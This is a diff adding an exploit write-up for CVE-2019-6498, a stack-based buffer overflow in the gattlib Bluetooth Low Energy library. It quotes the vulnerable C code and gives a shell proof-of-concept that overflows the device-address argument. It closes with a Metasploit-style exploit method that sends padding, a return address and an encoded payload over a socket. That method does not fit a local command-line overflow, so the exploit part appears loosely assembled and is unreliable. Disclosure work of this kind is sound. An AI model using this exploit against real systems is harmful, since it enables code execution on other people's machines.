@@ -1,0 +1,60 @@
+Exploit Title: stack-based overflow
+# Date: 2019-11-21
+# Exploit Author: Dhiraj Mishra
+# Vendor Homepage: http://labapart.com/
+# Software Link: https://github.com/labapart/gattlib/issues/81
+# Version: 0.2
+# Tested on: Linux 4.15.0-38-generic
+# CVE: CVE-2019-6498
+# References:
+# https://github.com/labapart/gattlib/issues/81
+# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6498
+
+## Summary:
+While fuzzing gattlib (Gattlib is a library to access GATT information from
+BLE (Bluetooth Low Energy) devices) using clang 6.0 with ASAN a stack-based
+buffer-overflow was observed.
+
+## Vulnerable code from gattlib.c
+// Transform string from 'DA:94:40:95:E0:87' to 'dev_DA_94_40_95_E0_87'
+strncpy(device_address_str, dst, sizeof(device_address_str));
+for (i = 0; i < strlen(device_address_str); i++) {
+if (device_address_str[i] == ':') {
+device_address_str[i] = '_';
+}
+}
+
+## Vulnerable code from discover.c
+if (argc != 2) {
+printf("%s <device_address>\n", argv[0]);
+return 1;
+}
+
+connection = gattlib_connect(NULL, argv[1], BDADDR_LE_PUBLIC, BT_SEC_LOW,
+0, 0);
+if (connection == NULL) {
+fprintf(stderr, "Fail to connect to the bluetooth device.\n");
+return 1;
+}
+
+## PoC
+
+./discover `python -c 'print "A"*20'`
+
+## MSF code
+
+def exploit
+    connect
+
+    print_status("Sending #{payload.encoded.length} byte payload...")
+
+    # Building the buffer for transmission
+    buf = "A" * 20
+    buf += [ target.ret ].pack('V')
+    buf += payload.encoded
+
+    sock.put(buf)
+    sock.get
+
+    handler
+end
